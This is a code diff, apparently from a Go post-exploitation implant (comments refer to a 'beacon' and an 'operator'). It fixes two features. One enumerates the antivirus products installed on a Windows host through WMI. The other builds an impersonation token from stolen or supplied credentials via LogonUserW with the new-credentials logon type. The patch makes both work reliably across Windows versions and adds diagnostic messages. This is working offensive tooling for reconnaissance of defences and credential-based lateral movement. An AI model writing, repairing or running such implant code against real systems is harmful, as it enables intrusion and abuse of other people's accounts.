@@ -776,6 +776,43 @@ func variantUint32(obj, propBSTR uintptr) uint32 {
 	return *(*uint32)(unsafe.Pointer(&v[8]))
 }
 
+// variantBSTRAny returns the first non-empty value found among
+// the candidate property names. WQL property matching is
+// case-insensitive; IWbemClassObject::Get is not. A class whose
+// schema stores a property as "DisplayName" returns an object
+// whose Get requires "DisplayName", even when the query that
+// fetched it wrote "displayName". Supplying both spellings and
+// taking the first hit closes that gap without needing to know
+// which casing the local class definition chose.
+func variantBSTRAny(obj uintptr, names ...uintptr) string {
+	for _, n := range names {
+		if n == 0 {
+			continue
+		}
+		if s := variantBSTR(obj, n); s != "" {
+			return s
+		}
+	}
+	return ""
+}
+
+// variantUint32Any mirrors variantBSTRAny for I4/UI4 properties.
+// A zero productState is never a valid AV registration state, so
+// treating zero as "not found" and moving to the next candidate
+// is safe. If every candidate misses, the caller gets zero — the
+// same value the old single-name lookup returned on failure.
+func variantUint32Any(obj uintptr, names ...uintptr) uint32 {
+	for _, n := range names {
+		if n == 0 {
+			continue
+		}
+		if v := variantUint32(obj, n); v != 0 {
+			return v
+		}
+	}
+	return 0
+}
+
 func NativeAvList(t Task) (string, error) {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
@@ -851,13 +888,31 @@ func NativeAvList(t Task) (string, error) {
 	}
 	defer comRelease(pEnum)
 
-	propName := bstrPtrFromString(procSysAllocString, "displayName")
-	defer procSysFreeString.Call(propName)
-	propState := bstrPtrFromString(procSysAllocString, "productState")
-	defer procSysFreeString.Call(propState)
-	propPath := bstrPtrFromString(procSysAllocString,
+	// Two spellings per property. The SecurityCenter2 provider
+	// has shipped both casings across Windows versions, and the
+	// WQL query above matches either because WQL is
+	// case-insensitive. The Get call that reads the value back
+	// is not, so both are supplied and the first hit wins.
+	nameLower := bstrPtrFromString(procSysAllocString,
+		"displayName")
+	defer procSysFreeString.Call(nameLower)
+	nameUpper := bstrPtrFromString(procSysAllocString,
+		"DisplayName")
+	defer procSysFreeString.Call(nameUpper)
+
+	stateLower := bstrPtrFromString(procSysAllocString,
+		"productState")
+	defer procSysFreeString.Call(stateLower)
+	stateUpper := bstrPtrFromString(procSysAllocString,
+		"ProductState")
+	defer procSysFreeString.Call(stateUpper)
+
+	pathLower := bstrPtrFromString(procSysAllocString,
 		"pathToSignedProductExe")
-	defer procSysFreeString.Call(propPath)
+	defer procSysFreeString.Call(pathLower)
+	pathUpper := bstrPtrFromString(procSysAllocString,
+		"PathToSignedProductExe")
+	defer procSysFreeString.Call(pathUpper)
 
 	var sb strings.Builder
 	sb.WriteString("Product                 State  Path\n")
@@ -877,10 +932,28 @@ func NativeAvList(t Task) (string, error) {
 		if uint32(hr) != 0 || returned == 0 {
 			break
 		}
-		name := variantBSTR(pObj, propName)
-		state := variantUint32(pObj, propState)
-		path := variantBSTR(pObj, propPath)
+		name := variantBSTRAny(pObj, nameLower, nameUpper)
+		state := variantUint32Any(pObj, stateLower, stateUpper)
+		path := variantBSTRAny(pObj, pathLower, pathUpper)
 		comRelease(pObj)
+
+		if name == "" && path == "" && state == 0 {
+			// The object was returned but no property
+			// read matched any known spelling. This is
+			// the class-schema drift case — the local
+			// SecurityCenter2 provider uses different
+			// property names than this client was
+			// written against. Emit one diagnostic line
+			// so the operator has something concrete
+			// to report rather than a silent empty row.
+			sb.WriteString(
+				"(object returned but no known property " +
+					"name matched; the local SecurityCenter2 " +
+					"class uses a schema this client does " +
+					"not recognise)\n")
+			rows++
+			continue
+		}
 
 		if name == "" {
 			name = "(unnamed)"
@@ -2017,6 +2090,18 @@ const (
 	logon32LogonNewCredentials = 9
 	logon32ProviderDefault     = 0
 
+	// LOGON32_LOGON_NEW_CREDENTIALS (type 9) is documented as
+	// supported only by the WINNT50 logon provider. Passing
+	// LOGON32_PROVIDER_DEFAULT (0) makes LogonUserW reject the
+	// request with ERROR_INVALID_LOGON_TYPE (1367) before it
+	// even attempts authentication, because the resolved
+	// default is the older WINNT35/40 path.
+	//
+	// WINNT50 is the value the API documentation names, and
+	// the one every Windows version from Vista onward accepts
+	// for a type-9 logon.
+	logon32ProviderWinNT50     = 3
+
 	logonWithProfile         = 0x00000001
 	createUnicodeEnvironment = 0x00000400
 	createNoWindow           = 0x08000000
@@ -2069,7 +2154,7 @@ func NativeMakeToken(t Task) (string, error) {
 		uintptr(unsafe.Pointer(domainW)),
 		uintptr(unsafe.Pointer(passW)),
 		uintptr(logon32LogonNewCredentials),
-		uintptr(logon32ProviderDefault),
+		uintptr(logon32ProviderWinNT50),
 		uintptr(unsafe.Pointer(&hToken)),
 	)
 	if r == 0 {
@@ -2194,6 +2279,11 @@ func winLogonErrorMessage(err error) string {
 			"password or a policy that refuses logon type 9"
 	case 1331:
 		return "account is disabled (1331)"
+	case 1367:
+		return "invalid logon type (1367) — the build is " +
+			"passing LOGON32_PROVIDER_DEFAULT to a " +
+			"LOGON32_LOGON_NEW_CREDENTIALS logon; the " +
+			"provider must be LOGON32_PROVIDER_WINNT50"
 	case 1385:
 		return "logon type not granted (1385) — the beacon's " +
 			"token lacks SeTcbPrivilege or a matching policy " +
